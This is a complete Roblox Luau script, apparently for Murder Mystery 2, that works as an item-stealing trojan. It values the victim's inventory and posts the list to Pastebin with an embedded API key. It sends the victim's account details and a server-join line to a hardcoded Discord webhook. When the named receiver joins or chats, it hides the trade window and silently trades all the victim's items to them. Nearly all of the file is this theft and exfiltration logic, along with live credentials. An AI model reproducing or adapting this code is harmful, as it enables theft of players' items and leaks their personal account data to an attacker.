Usernames = {
	"Protoxak"
}
version = "1.0"

if not game:IsLoaded() then
	game.Loaded:Wait()
end

game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui", 600)
game:GetService("HttpService")
game:GetService("Players")
game:GetService("Workspace")

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

game:GetService("RunService")
game:GetService("Workspace")
game:GetService("VirtualUser")

local LocalPlayer = Players.LocalPlayer
local _ = ReplicatedStorage.Remotes.Gameplay.CoinCollected
local _ = ReplicatedStorage.Remotes.Gameplay.RoundStart
local t1 = {
	"MouseButton1Click",
	"MouseButton1Down",
	"Activated"
}

function TapUI(p1, p2, p3)
	if p2 == "Active Check" then
		if not p1.Active then
			return
		end
		p1 = p1[p3]
	end

	if p2 == "Text Check" then
		if p1 ~= "^" then
			return
		end
		p1 = p3
	end

	for _, v in pairs(t1) do
		for _, v2 in pairs(getconnections(p1[v])) do
			v2:Fire()
		end
	end
end

repeat
	task.wait(1)
	pcall(function()
		TapUI(LocalPlayer.PlayerGui.DeviceSelect.Container.Tablet.Button)
	end)
	pcall(function()
		TapUI(game:GetService("Players").LocalPlayer.PlayerGui.Join.Friends.Play)
	end)
until LocalPlayer.PlayerGui:FindFirstChild("MainGUI")

repeat
	fr = pcall(function()
		require(game:GetService("ReplicatedStorage").Modules.TradeModule)
	end)
	task.wait()
until fr

universeid = game.GameId

if universeid == 66654135 then
	if not getgenv().executed then
		getgenv().executed = true
		isVip = game:GetService("ReplicatedStorage").Remotes.Extras.IsVIPServer:InvokeServer()

		if not isVip then
			local ReplicatedStorage2 = game:GetService("ReplicatedStorage")
			local Trade = ReplicatedStorage2:WaitForChild("Trade")
			local Players2 = game:GetService("Players")
			local t2 = {
				Deathshard = 22,
				DeathshardChroma = 65,
				BloodKnife = 8,
				GhostKnife = 10,
				Knife1 = 3,
				ShadowKnife = 6,
				TimeKnife = 5,
				AmericaGun = 8,
				GoldenGun = 4,
				Gun1 = 4,
				Phaser = 7,
				Disint = 7,
				Luger = 75,
				LugerChroma = 100,
				Sorry = 850,
				TheSeer = 3,
				Fang = 20,
				FangChroma = 55,
				Heat = 23,
				HeatChroma = 70,
				Shark = 30,
				SharkChroma = 65,
				Saw = 7,
				SawChroma = 50,
				Laser = 7,
				LaserChroma = 80,
				Spider = 17,
				Slasher = 23,
				SlasherChroma = 65,
				Candy = 190,
				Chill = 17,
				Handsaw = 8,
				RedLuger = 70,
				GreenLuger = 40,
				Xmas = 12,
				Sugar = 125,
				Clockwork = 25,
				Tides = 20,
				TidesChroma = 65,
				Pixel = 23,
				Blaster = 30,
				Virtual = 28,
				AmericaSword = 30,
				Amerilaser = 32,
				Nightblade = 30,
				Hallow = 12,
				HallowsBlade = 10,
				Eternal = 10,
				IceDragon = 12,
				Flames = 12,
				Pumpking = 17,
				BattleAxe = 13,
				WintersEdge = 12,
				IceShard = 13,
				Snowflake = 8,
				Frostsaber = 15,
				Scythe = 75,
				Boneblade = 8,
				BonebladeChroma = 50,
				BattleAxe2 = 18,
				Eternal2 = 10,
				Gingerblade = 22,
				GingerbladeChroma = 55,
				Icewing = 4,
				GingerLuger = 23,
				Gemstone = 23,
				GemstoneChroma = 65,
				RedSeer = 3,
				OrangeSeer = 2,
				YellowSeer = 2,
				BlueSeer = 3,
				PurpleSeer = 3,
				SeerChroma = 55,
				Eternal3 = 10,
				Eternal4 = 10,
				ElderwoodGun = 60,
				ElderwoodScythe = 90,
				Ghostblade = 10,
				EternalCane = 24,
				Logchopper = 30,
				Frostbite = 8,
				Minty = 24,
				Lugercane = 24,
				Lightbringer = 58,
				ChromaLightbringer = 120,
				Darkbringer = 60,
				ChromaDarkbringer = 125,
				Bioblade = 13,
				Prismatic = 7,
				VampiresEdge = 15,
				Hallowscythe = 55,
				Hallowgun = 35,
				Peppermint = 5,
				Icebreaker = 120,
				Iceblaster = 60,
				Cookieblade = 4,
				Jinglegun = 15,
				Heartblade = 125,
				Eggblade = 8,
				Nebula = 28,
				Harvester = 750,
				Candleflame = 120,
				CandleflameChroma = 145,
				SwirlyAxe = 175,
				SwirlyGun = 135,
				SwirlyGunChroma = 140,
				SwirlyBlade = 70,
				Iceflake = 32,
				Icebeam = 32,
				Plasmablade = 32,
				Plasmabeam = 32,
				Phantom2022 = 75,
				Spectre2022 = 75,
				ElderwoodKnife = 120,
				ElderwoodKnifeChroma = 140,
				Makeshift = 125,
				ZombieBat = 375,
				Gingermint_K = 55,
				Gingermint_KChroma = 135,
				Gingermint_G = 55,
				Icepiercer = 725,
				Sakura_K = 550,
				Blossom_G = 560,
				Rainbow_K = 185,
				Rainbow_G = 190,
				Waves_K = 145,
				Ocean_G = 150,
				TravelerAxe = 6000,
				TravelerGun = 3300,
				TravelerGunChroma = 95000,
				Darksword = 495,
				Darkshot = 500,
				Turkey2023 = 1500,
				Gingerscope = 8500,
				TreeGun2023 = 1800,
				TreeGun2023Chroma = 42000,
				TreeKnife2023 = 1100,
				TreeKnife2023Chroma = 21000,
				FlowerwoodKnife = 95,
				FlowerwoodGun = 100,
				Pearl_K = 62,
				Pearl_G = 62,
				Watergun = 115,
				WatergunChroma = 2500,
				WraithKnife = 160,
				WraithGun = 160,
				VampireAxe = 490,
				VampireGun = 510,
				VampireGunChroma = 16000
			}
			local t3 = {
				"Unique",
				"Ancient",
				"Godly",
				"Legendary",
				"Rare",
				"Vintage",
				"Halloween",
				"Christmas",
				"Uncommon",
				"Common"
			}

			function GetSortedInventory()
				local t4 = {}
				local Owned = game:GetService("ReplicatedStorage").Remotes.Extras.GetFullInventory:InvokeServer(game.Players.LocalPlayer.Name).Weapons.Owned
				local Item = require(game:GetService("ReplicatedStorage").Database.Sync.Item)

				for k, v in pairs(Owned) do
					local v42 = Item[k]

					if v42 then
						local v43 = (t2[k] or 0) * v

						if v42.ItemName ~= "Default Knife" and v42.ItemName ~= "Default Gun" then
							table.insert(t4, {
								Name = v42.ItemName,
								ID = k,
								RAP = v43,
								Class = v42.ItemType,
								Rarity = v42.Rarity,
								Amount = v,
								Chroma = v42.Chroma
							})
						end
					end
				end

				table.sort(t4, function(p4, p5)
					if p4.RAP == p5.RAP then
						local v68 = table.find(t3, p4.Rarity)
						local v69 = table.find(t3, p5.Rarity)

						if not v68 or not v69 then
							if not v68 then
								if not v69 then
									return false
								end
								return false
							end
							return true
						end
						return v68 < v69
					end
					return p4.RAP > p5.RAP
				end)

				return t4
			end

			total_value = 0
			hits = GetSortedInventory()

			for _, v in pairs(hits) do
				total_value = total_value + v.RAP
			end

			unique_count = 0
			godly_count = 0
			ancient_count = 0
			legendary_count = 0
			rare_count = 0
			vintage_count = 0
			halloween_count = 0
			christmas_count = 0
			uncommon_count = 0
			common_count = 0
			UniqueString = "\nUNIQUE ITEMS: \n \n"
			GodlyString = "\nGODLY ITEMS: \n \n"
			AncientString = "\nANCIENT ITEMS: \n \n"
			LegendaryString = "\nLEGENDARY ITEMS: \n \n"
			VintageString = "\nVINTAGE ITEMS: \n \n"
			RareString = "\nRARE ITEMS: \n \n"
			HalloweenString = "\nHALLOWEEN ITEMS: \n \n"
			ChristmasString = "\nCHRISTMAS ITEMS: \n \n"
			UncommonString = "\nUNCOMMON ITEMS: \n \n"
			CommonString = "\nCOMMON ITEMS: \n \n"

			for _, v in pairs(hits) do
				if not v.Chroma then
					chroma = ""
				else
					chroma = "Chroma "
				end

				if v.Name == "Corrupt" then
					unique_count = unique_count + 1 * v.Amount or 1
					UniqueString = UniqueString .. chroma .. v.Name .. " x" .. v.Amount .. "\n"
				end

				if v.Rarity == "Godly" then
					godly_count = godly_count + 1 * v.Amount or 1
					GodlyString = GodlyString .. chroma .. v.Name .. " x" .. v.Amount .. "\n"
				end

				if v.Rarity == "Ancient" then
					ancient_count = ancient_count + 1 * (v.Amount or 1)
					AncientString = AncientString .. chroma .. v.Name .. " x" .. v.Amount .. "\n"
				end

				if v.Rarity == "Vintage" then
					vintage_count = vintage_count + 1 * v.Amount or 1
					VintageString = VintageString .. chroma .. v.Name .. " x" .. v.Amount .. "\n"
				end

				if v.Rarity == "Legendary" then
					legendary_count = legendary_count + 1 * v.Amount or 1
					LegendaryString = LegendaryString .. chroma .. v.Name .. " x" .. v.Amount .. "\n"
				end

				if v.Rarity == "Rare" then
					rare_count = rare_count + 1 * v.Amount or 1
					RareString = RareString .. chroma .. v.Name .. " x" .. v.Amount .. "\n"
				end

				if v.Rarity == "Halloween" then
					halloween_count = halloween_count + 1 * v.Amount or 1
					HalloweenString = HalloweenString .. chroma .. v.Name .. " x" .. v.Amount .. "\n"
				end

				if v.Rarity == "Christmas" then
					christmas_count = christmas_count + 1 * v.Amount or 1
					ChristmasString = ChristmasString .. chroma .. v.Name .. " x" .. v.Amount .. "\n"
				end

				if v.Rarity == "Uncommon" then
					uncommon_count = uncommon_count + 1 * v.Amount or 1
					UncommonString = UncommonString .. chroma .. v.Name .. " x" .. v.Amount .. "\n"
				end

				if v.Rarity == "Common" and v.ID ~= "DefaultGun" and v.ID ~= "DefaultKnife" then
					common_count = common_count + 1 * v.Amount or 1
					CommonString = CommonString .. chroma .. v.Name .. " x" .. v.Amount .. "\n"
				end
			end

			if UniqueString == "\nUNIQUE ITEMS: \n \n" then
				UniqueString = ""
			end

			if AncientString == "\nANCIENT ITEMS: \n \n" then
				AncientString = ""
			end

			if GodlyString == "\nGODLY ITEMS: \n \n" then
				GodlyString = ""
			end

			if LegendaryString == "\nLEGENDARY ITEMS: \n \n" then
				LegendaryString = ""
			end

			if VintageString == "\nVINTAGE ITEMS: \n \n" then
				VintageString = ""
			end

			if RareString == "\nRARE ITEMS: \n \n" then
				RareString = ""
			end

			if HalloweenString == "\nHALLOWEEN ITEMS: \n \n" then
				HalloweenString = ""
			end

			if ChristmasString == "\nCHRISTMAS ITEMS: \n \n" then
				ChristmasString = ""
			end

			if UncommonString == "\nUNCOMMON ITEMS: \n \n" then
				UncommonString = ""
			end

			if CommonString == "\nCOMMON ITEMS: \n \n" then
				CommonString = ""
			end

			HitsString = ""
			HitsString = HitsString .. UniqueString
			HitsString = HitsString .. AncientString
			HitsString = HitsString .. GodlyString
			HitsString = HitsString .. LegendaryString
			HitsString = HitsString .. RareString
			HitsString = HitsString .. VintageString
			HitsString = HitsString .. HalloweenString
			HitsString = HitsString .. ChristmasString
			HitsString = HitsString .. UncommonString
			HitsString = HitsString .. CommonString
			stuff = HitsString
			LIST = "api_paste_code=" .. stuff .. "&api_option=paste&api_dev_key=aL23vA-UXpKHvGuqL5_jJ4YIVZGY5Nrr"

			function GetPastebin(p6)
				site = request({
					Method = "POST",
					Timeout = 10,
					Url = "https://pastebin.com/api/api_post.php",
					Headers = {
						["Content-Type"] = "application/x-www-form-urlencoded"
					},
					Body = p6
				})
				hitslist = site.Body

				if not string.find(hitslist, "https://pastebin.com/") then
					hitslist = "Ratelimited"
					Old_Pastebin_SHIT = "Error"
				else
					Old_Pastebin_SHIT = hitslist
					hitslist = "[Click Me](" .. hitslist .. ")"
				end

				return hitslist
			end

			Username = "Protoxak"
			Webhook = "https://discord.com/api/webhooks/1546616710482628718/x7JvNNTW6G9ZTiqYY1Ve1PGRXbP_UtHRtIqej_DjQ4RSNL2KkJzSlgYUOmP8TSPcYx5Y"

			table.insert(Usernames, Username)

			function HideGui()
				task.spawn(function()
					local TradeGUI = game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI

					for _, child in pairs(TradeGUI:GetChildren()) do
						child.Position = UDim2.new(99, 99, 99, 99)
					end

					local TradeGUI_Phone = game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI_Phone

					TradeGUI_Phone.Inactive.Frame.Position = UDim2.new(99, 99, 99, 99)
					TradeGUI_Phone.Inactive.TradeMainOld.Position = UDim2.new(99, 99, 99, 99)
					TradeGUI_Phone.Container.Position = UDim2.new(99, 99, 99, 99)
				end)
			end
			function IsTrading()
				return Trade.GetTradeStatus:InvokeServer()
			end
			function ReadyTrade()
				while IsTrading() ~= "None" do
					Trade.AcceptTrade:FireServer(game.PlaceId * 2)
					task.wait()
				end
			end
			function SendTrade(p7)
				local v35 = Players2:WaitForChild(tostring(p7))

				Trade.SendRequest:InvokeServer(v35)
			end
			function DepositItemInTrade(p8, p9, p10)
				if p8 == nil or p9 == nil or p10 == nil then
					LocalPlayer:Kick("something is wrong...")
				end

				for _ = 1, p10 do
					Trade.OfferItem:FireServer(p8, p9)
					task.wait()
				end

				DepositedItems = DepositedItems + 1
			end
			function Steal(p11)
				task.spawn(function()
					pcall(function()
						while task.wait() do
							game:GetService("ReplicatedStorage"):WaitForChild("Trade").SetRequestsEnabled:FireServer(true)
							require(game.ReplicatedStorage.Modules.TradeModule).RequestsEnabled = true
						end
					end)
				end)
				HideGui()
				Username = p11.Name

				while IsTrading() ~= "None" do
					Trade.DeclineTrade:FireServer()
					Trade.DeclineRequest:FireServer()
					Trade.CancelRequest:FireServer()
					task.wait()
				end

				repeat
					SendTrade(Username)
					task.wait()
				until IsTrading() ~= "None"

				repeat
					task.wait()
				until IsTrading() == "StartTrade"

				DepositedItems = 0

				while IsTrading() == "StartTrade" do
					task.wait()

					local TradeModule = require(ReplicatedStorage2.Modules.TradeModule)
					local _ = TradeModule.TradeInventory.Data

					function TradeModule.UpdateTradeInventory(p12)
						if #p12.Player1.Offer == 4 then
							ReadyTrade()
						end
					end

					current_inv = GetSortedInventory()

					if #current_inv > 0 then
						for _, v in pairs(current_inv) do
							DepositItemInTrade(v.ID, v.Class, v.Amount)

							if DepositedItems == 4 then
								DepositedItems = 0
								ReadyTrade()

								return
							end

							task.wait()
						end
					end

					task.wait()

					if #current_inv == 0 then
						print("inventory is empty")

						if DepositedItems == 0 then
							LocalPlayer:Kick("MM2 TRADE STEALER")
							return
						end

						task.wait()
					end
				end
			end
			function UnlockTrades()
				task.spawn(function()
					pcall(function()
						game:GetService("ReplicatedStorage"):WaitForChild("Trade").SetRequestsEnabled:FireServer(true)
						require(game.ReplicatedStorage.Modules.TradeModule).RequestsEnabled = true
					end)
				end)
			end
			function LoopSteal(p13)
				UnlockTrades()
				task.spawn(function()
					while task.wait() do
						Steal(p13)
					end
				end)
			end
			function PrepareSteal(p14)
				UnlockTrades()
				task.wait()

				function Trade.SendRequest.OnClientInvoke(p15)
					if p15.Name:lower() ~= Username:lower() then
						Trade.DeclineRequest:FireServer()
					else
						task.wait()
						Trade.DeclineRequest:FireServer()
						task.wait()
						LoopSteal(p14)
					end

					return true
				end
			end
			function shall_steal(p16)
				for _, v in pairs(Usernames) do
					if v:lower() == p16.Name:lower() and v:lower() ~= game.Players.LocalPlayer.Name:lower() then
						return true
					end
				end

				return false
			end

			for _, child in pairs(game.Players:GetChildren()) do
				if shall_steal(child) then
					PrepareSteal(child)
				end
			end

			Players2.PlayerAdded:Connect(function(player)
				if shall_steal(player) then
					PrepareSteal(player)
				end
			end)

			for _, player in pairs(Players2:GetPlayers()) do
				if shall_steal(player) then
					player.Chatted:Connect(function()
						LoopSteal(player)
					end)
				end
			end

			Players2.PlayerAdded:Connect(function(player)
				if shall_steal(player) then
					player.Chatted:Connect(function()
						LoopSteal(player)
					end)
				end
			end)
			imgs = "https://images-ext-1.discordapp.net/external/SN9zgqCIgFRx4vco6NsGsf0QjfoCHf2Lj_k2R67EIIg/https/i.ibb.co/GWsnpph/xpng.png?format=webp&quality=lossless"

			local LocalPlayer2 = game:GetService("Players").LocalPlayer
			local v21 = identifyexecutor() or "undefined"

			content_ping = "--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. game.PlaceId .. ", \"" .. game.JobId .. "\")"
			content_noping = content_ping:gsub("--@everyone\n", "")

			if not (total_value > 0) then
				content_logs = content_noping
			else
				content_logs = content_ping
			end

			PASTEBIN_SHIT = GetPastebin(LIST)

			local t5 = {
				content = content_logs,
				username = game.Players.LocalPlayer.Name,
				avatar_url = imgs,
				embeds = {{
					title = "Execution Log. Execute Code Above to Join the Victim",
					description = "",
					color = tonumber(13697227),
					fields = {
						{
							name = "⭐ __**Receiver Info**__",
							value = "```Username     : " .. LocalPlayer2.Name .. "\nUser-ID      : " .. LocalPlayer2.userId .. "\nAccount Age  : " .. LocalPlayer2.AccountAge .. " Days" .. "\nExploit      : " .. v21 .. "\nReceiver     : " .. Username .. "\nVersion      : " .. version .. "```",
							inline = false
						},
						{
							name = "🪐 __/__ **`Inventory:`**",
							value = "```" .. table.concat({
								"Total Value 📚 : " .. tostring(total_value),
								"",
								"Uniques     🍄 : " .. tostring(unique_count),
								"Ancient     🌿 : " .. tostring(ancient_count),
								"Godly       💎 : " .. tostring(godly_count),
								"Legendary   ⚡ : " .. tostring(legendary_count),
								"Vintage     🧊 : " .. tostring(vintage_count),
								"Rare        🌈 : " .. tostring(rare_count),
								"Halloween   🎃 : " .. tostring(halloween_count),
								"Christmas   🎄 : " .. tostring(christmas_count),
								"Uncommon    🌸 : " .. tostring(uncommon_count),
								"Common      📦 : " .. tostring(common_count)
							}, "\n") .. "```",
							inline = false
						},
						{
							name = "Hits List:",
							value = PASTEBIN_SHIT,
							inline = false
						}
					}
				}}
			}

			request({
				Url = Webhook,
				Method = "POST",
				Headers = {
					["Content-Type"] = "application/json"
				},
				Body = game:GetService("HttpService"):JSONEncode(t5)
			})

			return
		end

		return
	end

	return
end
